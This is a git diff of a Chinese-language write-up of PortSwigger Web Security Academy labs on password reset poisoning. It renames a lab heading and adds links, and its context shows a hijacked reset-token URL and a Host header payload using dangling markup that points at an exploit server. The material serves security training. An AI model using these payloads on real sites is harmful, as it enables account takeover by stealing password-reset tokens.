@@ -349,7 +349,7 @@ Content-Length: 109
 <html><head><title>Client Error: Forbidden</title></head><body><h1>Client Error: Forbidden</h1></body></html>
 ```
 
-後來嘗試
+後來嘗試 Full URL
 
 ```
 GET https://0adb005f03476ccc83440ae700e800f3.web-security-academy.net/ HTTP/2
@@ -477,12 +477,12 @@ username=carlos&csrf=HQHgq9K9G7JvzBKQFOG9NVrJqaxqxOzj
 
 之後訪問 https://0aaf00ed0338460881cf850a00b60072.web-security-academy.net/forgot-password?temp-forgot-password-token=eltc9c54h6jvgqzj7u9pld3fzzgla5o4 ，就可以成功更換密碼～
 
-## Lab: Basic password reset poisoning
+## Lab: Password reset poisoning via middleware
 
 | Dimension | Description                                                                                                                             |
 | --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning#how-to-construct-a-password-reset-poisoning-attack |
-| Lab       | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning     |
+| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware                        |
 
 先嘗試跑一次忘記密碼的流程，看到
 
@@ -577,7 +577,7 @@ Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:' data-hello='
 >
 ```
 
-嘗試
+嘗試 [Dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) 的技巧
 
 ```
 Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:' ></a></p><a href="https://exploit-0a24003303edf426814dd45101c400eb.exploit-server.net
